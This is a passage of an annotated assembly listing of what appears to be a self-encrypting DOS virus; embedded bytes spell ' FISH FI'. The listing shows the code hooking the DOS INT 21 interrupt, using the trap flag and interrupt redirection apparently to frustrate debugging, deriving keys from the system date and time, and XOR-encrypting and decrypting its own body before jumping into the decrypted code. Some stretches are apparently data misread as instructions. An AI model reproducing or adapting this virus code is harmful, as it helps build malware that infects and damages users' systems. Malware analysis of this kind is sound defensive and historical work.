0E26 58                      POP AX                     ; Restore AX
0E27 5D                      POP BP                     ; Restore BP
0E28 2E 8B 26 DF 0E          CS MOV SP,W[0EDF]          ; SP = [0EDF]
0E2D 2E 8E 16 DD 0E          CS MOV SS,W[0EDD]          ; SS = [0EDD]
0E32 E9 34 FF                JMP 0D69                   ;  0D69
                                                        ; Here If [0E50] = 0
0E35 81 66 06 FF FE          AND W[BP+6],0FEFF          ; Clear Trap Flag
0E3A EB CF                   JMP 0E0B                   ;  Return
                                                        ; Here if [0E50] == 1
0E3C 2E FE 0E 51 0E          CS DEC B[0E51]             ; [0E51]--
0E41 75 C8                   JNE 0E0B                   ; [0E51] != 0 ?  Return
0E43 81 66 06 FF FE          AND W[BP+6],0FEFF          ; Clear Trap Flag
0E48 E8 71 F3                CALL 01BC                  ; Set Stack & PushA.
0E4B E8 1E F3                CALL 016C                  ; Push All Registers.
0E4E B4 2C                   MOV AH,02C                 ; AH = 2C
0E50 E8 0E F3                CALL 0161                  ; INT 21 | Get Time
0E53 2E 88 16 51 0D          CS MOV B[0D51],DL          ; [0D51] = Hundredths
0E58 2E 88 16 6E 0D          CS MOV B[0D6E],DL          ; [0D6E] = Hundredths
0E5D 80 EC 02                SUB AH,2                   ; AH = 2A
0E60 E8 FE F2                CALL 0161                  ; INT 21 | Get Date
0E63 02 F2                   ADD DH,DL                  ; DH = Month + Day
0E65 2E 88 36 84 0D          CS MOV B[0D84],DH          ; [0D84] = Month + Day
0E6A 2E 88 36 DC 0D          CS MOV B[0DDC],DH          ; [0DDC] = Month + Day
0E6F B0 03                   MOV AL,3                   ; AL = 03
0E71 E8 AC F3                CALL 0220                  ; ES:BX -> INT #03
0E74 06                      PUSH ES                    ;
0E75 1F                      POP DS                     ; DS = INT 03 Segment
0E76 89 DA                   MOV DX,BX                  ; DX = INT 03 Offset
0E78 B0 01                   MOV AL,1                   ; AL = 01
0E7A E8 8D F3                CALL 020A                  ; Set INT #01 to INT 03
0E7D E8 FF F2                CALL 017F                  ; Pop All Registers.
0E80 E8 5F F3                CALL 01E2                  ; Swap Jump To INT 21
0E83 E8 11 F3                CALL 0197                  ; Set Stack & PopA.
0E86 53                      PUSH BX                    ; Save BX
0E87 51                      PUSH CX                    ; Save CX
0E88 BB 28 00                MOV BX,028                 ; BX = 0028
0E8B B9 87 02                MOV CX,0287                ; CX = 0287
0E8E 2E 80 37 5C             CS XOR B[BX],05C           ; XOR Code With [0E91]
0E92 83 C3 05                ADD BX,5                   ; BX+=0005
0E95 E2 F7                   LOOP 0E8E                  ; Until All Done
0E97 59                      POP CX                     ; Restore CX
0E98 5B                      POP BX                     ; Restore BX
0E99 EB 9A                   JMP 0E35                   ; Return

                        ; External INT 21 Entry Point.

0E9B 2E 80 0E 28 00 00       CS OR B[028],0
0EA1 74 13                   JE 0EB6
0EA3 53                      PUSH BX
0EA4 51                      PUSH CX
0EA5 BB 28 00                MOV BX,028
0EA8 B9 87 02                MOV CX,0287
0EAB 2E 80 37 5C             CS XOR B[BX],05C
0EAF 83 C3 05                ADD BX,5
0EB2 E2 F7                   LOOP 0EAB
0EB4 59                      POP CX
0EB5 5B                      POP BX
0EB6 E9 F3 F4                JMP 03AC
0EB9 51                      PUSH CX
0EBA 53                      PUSH BX
0EBB BB 28 00                MOV BX,028
0EBE B9 58 0D                MOV CX,0D58
0EC1 2E 80 37 02             CS XOR B[BX],2
0EC5 43                      INC BX
0EC6 E2 F9                   LOOP 0EC1
0EC8 5B                      POP BX
0EC9 59                      POP CX
0ECA E8 94 F2                CALL 0161                  ; INT 21
0ECD EB 3F                   JMP 0F0E
0ECF B8 2E 8F                MOV AX,08F2E
0ED2 06                      PUSH ES
0ED3 41                      INC CX
0ED4 0E                      PUSH CS
0ED5 2E 8F 06 43 0E          CS POP W[0E43]
0EDA 2E 8F 06 DB 0E          CS POP W[0EDB]
0EDF 2E 83 26 DB 0E FE       CS AND W[0EDB],-2
0EE5 2E 80 3E DA 0E 00       CS CMP B[0EDA],0
0EEB 75 11                   JNE 0EFE
0EED 2E FF 36 DB 0E          CS PUSH W[0EDB]
0EF2 2E FF 1E 2D 0E          CS CALL D[0E2D]
0EF7 73 06                   JAE 0EFF
0EF9 2E FE 06 DA 0E          CS INC B[0EDA]
0EFE F9                      STC
0EFF 2E FF 2E 41 0E          CS JMP D[0E41]
0F04 89 32                   MOV W[BP+SI],SI
0F06 C0 2E C6 06 DA          SHR B[06C6],-026
0F0B 0E                      PUSH CS
0F0C 01 CF                   ADD DI,CX

                        ; Entry Point.      Decription Rutine.

0F0E E8 00 00                CALL 0F11                  ; Call to Get BX
0F11 5B                      POP BX                     ; BX=0F11
0F12 81 EB A9 0D             SUB BX,0DA9                ; BX=0168 Decriptive Ofs
0F16 B9 58 0D                MOV CX,0D58                ; CX=0D58
0F19 2E 80 37 02             CS XOR B[BX],2             ; XOR Program with 02
0F1D 43                      INC BX                     ; INC BX
0F1E E2 F9                   LOOP 0F19                  ; 'till all decripted
0F20 2E FE 8F B3 00          CS DEC B[BX+0B3]           ; BX=0EC0
0F25 74 03                   JE RET                     ; If [0EC0] was 1 EndPrg
0F27 E9 60 F4                JMP 038A                   ; Go on in decripted code
0F2A C3                      RET                        ; End program

0F2B 20 46 49                AND B[BP+049],AL
0F2E 53                      PUSH BX
0F2F 48                      DEC AX
0F30 20 46 49                AND B[BP+049],AL
0F33 00 00                   ADD B[BX+SI],AL
0F35 00 00                   ADD B[BX+SI],AL
0F37 00 00                   ADD B[BX+SI],AL
